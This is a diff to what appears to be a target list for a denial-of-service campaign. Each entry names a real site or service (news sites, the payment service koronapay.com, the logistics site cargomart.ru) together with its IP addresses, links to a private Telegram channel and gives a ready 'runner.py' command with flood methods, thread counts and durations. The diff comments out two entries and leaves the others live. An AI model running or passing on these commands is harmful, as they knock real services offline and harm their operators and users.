@@ -1,5 +1,5 @@
 ### rusvesna.su https://t.me/c/1624648668/87
-runner.py http://rusvesna.su/ http://m.rusvesna.su/ -t 1000 -p 3600 --rpc 50 --http-methods CFB --debug
+#runner.py http://rusvesna.su/ http://m.rusvesna.su/ -t 1000 -p 3600 --rpc 50 --http-methods CFB --debug
 
 ### smotrim.ru https://t.me/c/1624648668/85
 runner.py tcp://80.249.129.244:443 tcp://80.249.129.244:80 -t 1000 -p 3600 --rpc 50 --http-methods TCP FLOOD --debug
@@ -11,7 +11,7 @@ runner.py tcp://92.223.84.84:80 tcp://92.223.84.84:443 tcp://91.194.226.50:80 tc
 runner.py tcp://87.226.162.181:80 tcp://87.226.162.181:443 tcp://87.226.162.53:80 tcp://87.226.162.53:443 tcp://95.167.23.6:80 tcp://95.167.23.6:443 -t 1000 -p 3600 --rpc 50 --http-methods TCP FLOOD --debug
 
 ### https://koronapay.com  194.85.18.32 : 80, 443 https://api.koronapay.com 194.85.18.31 : 80, 443 https://t.me/c/1638019445/4299
-runner.py tcp://194.85.18.32:80 tcp://194.85.18.32:443 tcp://194.85.18.31:80 tcp://194.85.18.31:443 -t 1000 -p 300 --rpc 50 --http-methods TCP FLOOD
+#runner.py tcp://194.85.18.32:80 tcp://194.85.18.32:443 tcp://194.85.18.31:80 tcp://194.85.18.31:443 -t 1000 -p 300 --rpc 50 --http-methods TCP FLOOD
 
 ### пачка целей по логистике, вот первая из них https://cargomart.ru/ https://t.me/c/1624648668/95
 runner.py https://cargomart.ru/ -t 1000 -p 300 --rpc 50 --http-methods bypass --debug
